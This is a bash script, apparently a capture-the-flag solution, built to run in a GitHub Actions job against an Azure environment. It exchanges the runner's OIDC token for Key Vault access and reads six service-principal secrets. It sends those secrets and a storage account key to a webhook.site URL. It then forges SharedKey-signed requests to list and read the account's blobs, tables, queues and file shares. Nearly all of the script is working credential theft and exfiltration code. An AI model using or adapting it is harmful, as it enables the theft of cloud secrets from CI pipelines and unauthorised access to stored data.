#!/usr/bin/env bash
# CTF DF26 v10: correct SharedKey HMAC; real read of sttblcilogsprodx3euoz (blob/table/queue/file); webhook exfil.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
M=https://management.azure.com
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
FL='DF26\{[^}]\{0,200}\}'
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
VT=$(fed "$C" "https://vault.azure.net/.default")
echo "===== CTX run=$GITHUB_RUN_ID ====="
J=""
for n in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  J="$J$n $(curl -s "$PV/secrets/$n?api-version=7.4" -H "Authorization: Bearer $VT" | jq -c '.value')\n"
done
printf '%b' "$J" | curl -s -X POST --data-binary @- "$WB/v10-sps-$GITHUB_RUN_ID" >/dev/null
SS=$(curl -s "$PV/secrets/sync-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value' | jq -r '.clientSecret')
A=$(spn "462d1c38-4459-48b8-9333-82e389e59514" "$SS" "https://management.azure.com/.default")
SA=sttblcilogsprodx3euoz
K=$(curl -s -X POST -H "Authorization: Bearer $A" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
echo "KEY=${K:+yes}"
[ -z "$K" ] && { echo DONE-V10; exit; }
curl -s -X POST -d "cilogs-key $K" "$WB/v10-key-$GITHUB_RUN_ID" >/dev/null
KH=$(printf '%s' "$K" | base64 -d | od -An -tx1 | tr -d ' \n')
req(){ # $1=url $2=canres(with \n seqs) $3=version
  local D SG
  D=$(date -u +"%a, %d %b %Y %H:%M:%S GMT")
  SG=$(printf '%b' "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:$D\nx-ms-version:$3\n$2" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$KH -binary | base64)
  curl -s "$1" -H "x-ms-date: $D" -H "x-ms-version: $3" -H "Authorization: SharedKey $SA:$SG"
}
echo "===== blob root"
R=$(req "https://$SA.blob.core.windows.net/?comp=list" "/$SA/\ncomp:list" "2021-08-06")
echo "$R" | head -c 900; echo
echo "$R" | grep -aoE "$FL"
for cont in $(echo "$R" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
  echo "CONT $cont"
  L=$(req "https://$SA.blob.core.windows.net/$cont?restype=container&comp=list" "/$SA/$cont\ncomp:list\nrestype:container" "2021-08-06")
  echo "$L" | head -c 700; echo
  for blob in $(echo "$L" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//' | head -30); do
    echo "BLOB $cont/$blob"
    data=$(req "https://$SA.blob.core.windows.net/$cont/$blob" "/$SA/$cont/$blob" "2021-08-06")
    echo "$data" | head -c 500; echo
    echo "$data" | grep -aoE "$FL"
  done
done
echo "===== tables"
req "https://$SA.table.core.windows.net/" "/$SA" "2019-02-02" | head -c 700; echo
echo "===== queues"
req "https://$SA.queue.core.windows.net/?comp=list" "/$SA/\ncomp:list" "2019-02-02" | head -c 700; echo
echo "===== file"
req "https://$SA.file.core.windows.net/?restype=account&comp=listedshares" "/$SA/\ncomp:listedshares\nrestype:account" "2021-06-08" | head -c 700; echo
echo DONE-V10
